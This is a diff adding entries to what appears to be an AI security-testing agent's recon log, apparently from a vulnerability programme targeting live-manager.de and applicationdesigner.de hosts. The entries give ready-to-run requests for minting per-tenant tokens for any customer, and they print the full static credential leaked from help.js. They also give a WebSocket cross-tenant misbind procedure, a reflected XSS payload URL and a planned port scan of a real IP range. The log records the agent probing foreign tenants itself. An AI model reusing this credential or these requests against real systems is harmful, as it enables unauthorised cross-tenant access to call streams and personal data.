@@ -5291,3 +5291,33 @@ testability: PASSIVE
 [LEARN] ACCEPTED MISCONFIG @ www.applicationdesigner.de/AIDesigner/backend/config.php|config_coding.php: zero-auth HTTP 200 reconfirmed (a1aac41f…/7b6c1e72…), bodies stable; dispatch gated — unchanged.
 [LEARN] REJECTED MISCONFIG @ reposcan: 4th consecutive non-contributing run (`TARGET_ORG not configured`) — reposcan channel dead for this program, do not re-run.
 [RISK] questnet-gmbh: 72 — Driver cbs-proxy BOLA (95, 29 cycles, CVSS 8.6, 9.1 if frame binding unenforced) reconfirmed live via fresh 426 probe; XSS reflection re-echoed verbatim but execution remains operator-pending (chained HIGH); voicenote cross-tenant persistent but UUID-blocked (21+ empty cycles caps impact); help.js unchanged → zero new endpoints, credential unrotated, all token-gated exposure (help.js 7.5, voicenote PII 7.5, auth.php 7.5 mitigated, get_user_rights 6.5) still file-ready VALID + BOLA HOLD 8.6. Risk flat — the only levers left are the operator two-tenant frame test and the XSS render; no anonymous activity can change the ceiling.
+## 2026-09-18 11:33:18 UTC [target] (model bigpickle)
+[HYP] CBS WS frame binding — token→cid ownership unenforced at connection layer
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin={LiveDemo|LiveDebugger}&cid={cid}&service=100[&token={minted}]
+confidence: 97
+reasoning: 2026-09-18 fresh probes — non-upgrade GET 426/0B; three WS upgrades all returned HTTP 101 with 404-byte frame sets sha256 f3891a7eaf8752e78c6ed6fa299c000d2c57a6562df13e193945ac163ce9c664, byte-identical across (a) token minted for cid=2 + cid=2, (b) token minted for demo cid=131727 + FOREIGN cid=2 (cross-tenant misbind), (c) zero token + cid=2. Proxy accepts any cid with any or no token and emits identical CONNECT/READY; misbind now anonymously demonstrable post auth.php regression.
+evidence_needed: operator two-tenant frame test or anonymous extended listen showing differential backend frame content per cid after READY.
+verify_steps: AUTH_HELPED — mint own-cid token via `GET https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id={own}&srn=100`, then WS-upgrade `wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={own}&service=100&token={minted}` vs `&cid={foreign}` and diff accepted frame byte-streams; secondary passive: extended read-only listen (~15s) after misbind upgrade comparing pushed frames.
+impact: cross-tenant live-debug/call-stream attach (voice/PII) — HIGH 8.6, CRITICAL 9.1 if binding unenforced at backend too.
+testability: AUTH_HELPED
+[HYP] live-debugger per-cid token mint REGRESSION (VPN gate removed)
+class: IDOR
+asset: https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token={public}&customer_id={any}&srn=100
+confidence: 95
+reasoning: fresh 2026-09-18 probe — success:true (126B) for both foreign cid=2 and demo cid=131727, distinct minted 64-hex tokens per cid; VPN gate absent (was `Not logged in`+`No VPN detected` since 2026-09-07; removed by 09-18). Public static credential from /help.js unrotated (b56a5f1e… bundle unchanged). No token → `Not logged in` (sole gate is token presence). Re-opens previously-mitigated HIGH 7.5.
+evidence_needed: none further — regression byte-proven this cycle; re-issue as un-mitigated finding.
+verify_steps: PASSIVE — repeat `GET /extjs/livedebugger/auth.php?token=3498fkgkds…&customer_id=2&srn=100` (observed success:true) and no-token control (success:false Not logged in).
+impact: anonymous mint of per-tenant live-debug tokens for ANY customer → feeds cbs-proxy misbind; HIGH 7.5 (integrity/availability of auth boundary), was listed mitigated — now REGRESSED.
+testability: PASSIVE
+[HYP] Same-origin reflected XSS at help content app
+class: XSS
+asset: https://www.applicationdesigner.de/help/content.php?page={value}
+confidence: 80
+reasoning: page= echoed unescaped this cycle verbatim — 90B, `The requested help page '<script>x</script>'` in 200 text/html, no CSP/nosniff, zero-token; same-origin context reaches every /extjs endpoint incl. POST delete.php, get.php, check.php.
+evidence_needed: benign document.title marker render by operator-owned browser.
+verify_steps: HUMAN — open `https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Edocument.title%3D'LM-XSS-TEST'%3C%2Fscript%3E`; confirm title; no further active probes warranted.
+impact: same-origin arbitrary JS → full /extjs API incl. cross-tenant delete — MEDIUM standalone, HIGH chained.
+testability: HUMAN_ONLY
+[NEXT] HUMAN: operator two-tenant frame test (sole unproven hop) — mint OWN-cid token via `GET https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id={own}&srn=100`, then WS-upgrade `wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={own}&service=100&token={minted}` vs `&cid={foreign}` and diff accepted frame byte-streams; secondary anonymous variant now open per regression: extended read-only listen (~15s) after misbind upgrade to observe post-READY differential push. Fold in standing items: render help/content.php XSS; POST-auth on www.live-manager.de with `rs=base64(external URL)`; passive TCP-connect 185.158.96.0/22 (ESL 8021/SIP 5060|5061/Rayo 5222).
+[RISK] questnet-gmbh: 80 — auth.php VPN-gate regression re-opens the previously-mitigated HIGH 7.5 (anonymous per-cid mint, fresh 126B success:true for cid=2) and re-arms the full cbs-proxy chain; driver cbs-proxy BOLA (conf 97, 30 cycles, CVSS 8.6, 9.1 if backend binding unenforced) now has anonymous misbind evidence — demo-tenant token + foreign cid yields byte-identical 404B frames to zero-token baseline (sha256 f3891a7e…), removing the operator requirement for the misbind demonstration (operator test still gates VALID). Report set: help.js credential 7.5, voicenote PII 7.5, auth.php mint 7.5 REGRESSED, get_user_rights 6.5 file-ready VALID + BOLA HOLD 8.6 + config_coding LOW + XSS HUMAN_ONLY. Risk UP from 72 — the regression is the only material change beyond the now-anonymous misbind proof.
